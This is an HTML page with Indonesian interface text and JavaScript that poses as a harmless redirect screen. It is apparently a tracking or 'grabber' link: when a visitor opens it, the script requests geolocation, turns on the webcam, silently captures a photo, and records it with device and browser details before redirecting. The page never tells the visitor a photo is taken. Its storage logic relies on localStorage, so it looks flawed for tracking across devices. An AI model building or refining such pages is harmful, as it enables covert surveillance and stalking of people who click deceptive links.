<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mengarahkan...</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #4a6fa5, #166088);
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            text-align: center;
        }
        
        .container {
            max-width: 500px;
            padding: 30px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            backdrop-filter: blur(10px);
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
        }
        
        h1 {
            margin-bottom: 20px;
            font-size: 1.8rem;
        }
        
        .loader {
            width: 50px;
            height: 50px;
            border: 5px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 1s ease-in-out infinite;
            margin: 20px auto;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        .message {
            margin: 20px 0;
            font-size: 1.1rem;
        }
        
        .permission-request {
            background: rgba(255, 255, 255, 0.2);
            padding: 15px;
            border-radius: 8px;
            margin: 20px 0;
        }
        
        .btn {
            background: #4fc3a1;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 1rem;
            margin: 5px;
            transition: background 0.3s;
        }
        
        .btn:hover {
            background: #3da58a;
        }
        
        .btn-secondary {
            background: rgba(255, 255, 255, 0.2);
        }
        
        .btn-secondary:hover {
            background: rgba(255, 255, 255, 0.3);
        }
        
        .error {
            color: #ff6b6b;
            background: rgba(255, 255, 255, 0.1);
            padding: 15px;
            border-radius: 8px;
            margin: 20px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Mempersiapkan Pengalihan</h1>
        <div class="loader"></div>
        <div class="message" id="status-message">Memeriksa link...</div>
        <div id="permission-section" style="display: none;">
            <div class="permission-request">
                <p>Untuk pengalaman terbaik, izinkan akses ke:</p>
                <button id="allow-camera" class="btn">Izinkan Kamera</button>
                <button id="allow-location" class="btn">Izinkan Lokasi</button>
            </div>
            <button id="continue-btn" class="btn btn-secondary" style="display: none;">Lanjutkan Tanpa Izin</button>
        </div>
        <div id="error-section" class="error" style="display: none;">
            <p id="error-message"></p>
            <button id="retry-btn" class="btn">Coba Lagi</button>
        </div>
    </div>

    <script>
        // KONFIGURASI DOMAIN
        const ADMIN_DOMAIN = window.location.origin;

        // Data tracking
        let trackingData = {
            trackId: null,
            linkName: null,
            timestamp: new Date().toISOString(),
            location: null,
            photo: null,
            ip: null,
            device: navigator.platform,
            browser: navigator.userAgent
        };
        
        // Elemen DOM
        const statusMessage = document.getElementById('status-message');
        const permissionSection = document.getElementById('permission-section');
        const errorSection = document.getElementById('error-section');
        const errorMessage = document.getElementById('error-message');
        const allowCameraBtn = document.getElementById('allow-camera');
        const allowLocationBtn = document.getElementById('allow-location');
        const continueBtn = document.getElementById('continue-btn');
        const retryBtn = document.getElementById('retry-btn');
        
        // Fungsi untuk menampilkan error
        function showError(message) {
            statusMessage.style.display = 'none';
            errorMessage.textContent = message;
            errorSection.style.display = 'block';
        }
        
        // Fungsi untuk memulai proses tracking
        function startTracking() {
            const urlParams = new URLSearchParams(window.location.search);
            const trackId = urlParams.get('track');
            
            if (!trackId) {
                showError('Link tracking tidak valid');
                return;
            }
            
            trackingData.trackId = trackId;
            
            // Dapatkan data link dari localStorage
            try {
                const trackingLinks = JSON.parse(localStorage.getItem('trackingLinks')) || [];
                const link = trackingLinks.find(l => l.id === trackId);
                
                if (!link) {
                    showError('Link tracking tidak ditemukan');
                    return;
                }
                
                trackingData.linkName = link.name;
                trackingData.destinationUrl = link.destination;
                
                statusMessage.textContent = 'Mengumpulkan data...';
                permissionSection.style.display = 'block';
                
                getLocationAndPhoto();
                
            } catch (error) {
                showError('Error: ' + error.message);
            }
        }
        
        // Fungsi untuk mendapatkan lokasi dan foto
        function getLocationAndPhoto() {
            // Dapatkan lokasi
            if (navigator.geolocation) {
                statusMessage.textContent = 'Meminta izin lokasi...';
                
                navigator.geolocation.getCurrentPosition(
                    position => {
                        trackingData.location = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy
                        };
                        statusMessage.textContent = 'Lokasi didapatkan. Meminta izin kamera...';
                        takePhoto();
                    },
                    error => {
                        console.log('Tidak dapat lokasi:', error);
                        statusMessage.textContent = 'Tidak dapat lokasi. Meminta izin kamera...';
                        takePhoto();
                    }
                );
            } else {
                statusMessage.textContent = 'Geolocation tidak didukung. Meminta izin kamera...';
                takePhoto();
            }
        }
        
        // Fungsi untuk mengambil foto
        function takePhoto() {
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                navigator.mediaDevices.getUserMedia({ video: true })
                    .then(stream => {
                        const video = document.createElement('video');
                        video.srcObject = stream;
                        video.play();
                        
                        setTimeout(() => {
                            const canvas = document.createElement('canvas');
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;
                            const context = canvas.getContext('2d');
                            context.drawImage(video, 0, 0, canvas.width, canvas.height);
                            
                            trackingData.photo = canvas.toDataURL('image/jpeg');
                            
                            stream.getTracks().forEach(track => track.stop());
                            
                            statusMessage.textContent = 'Foto diambil. Menyimpan...';
                            saveAndRedirect();
                        }, 1000);
                    })
                    .catch(error => {
                        console.log('Tidak dapat akses kamera:', error);
                        statusMessage.textContent = 'Tidak dapat kamera. Menyimpan...';
                        saveAndRedirect();
                    });
            } else {
                statusMessage.textContent = 'Kamera tidak didukung. Menyimpan...';
                saveAndRedirect();
            }
        }
        
        // Fungsi untuk menyimpan data dan redirect
        function saveAndRedirect() {
            statusMessage.textContent = 'Menyimpan data...';
            
            try {
                // Simpan ke localStorage
                const trackingResults = JSON.parse(localStorage.getItem('trackingResults')) || [];
                trackingResults.push(trackingData);
                localStorage.setItem('trackingResults', JSON.stringify(trackingResults));
                
                // Redirect setelah 2 detik
                setTimeout(() => {
                    window.location.href = trackingData.destinationUrl;
                }, 2000);
                
            } catch (error) {
                console.error('Error saving:', error);
                // Tetap redirect
                setTimeout(() => {
                    window.location.href = trackingData.destinationUrl;
                }, 2000);
            }
        }
        
        // Event listeners
        allowCameraBtn.addEventListener('click', takePhoto);
        allowLocationBtn.addEventListener('click', getLocationAndPhoto);
        continueBtn.addEventListener('click', saveAndRedirect);
        retryBtn.addEventListener('click', () => {
            errorSection.style.display = 'none';
            statusMessage.style.display = 'block';
            startTracking();
        });
        
        // Mulai saat halaman dimuat
        document.addEventListener('DOMContentLoaded', startTracking);
    </script>
</body>
</html>
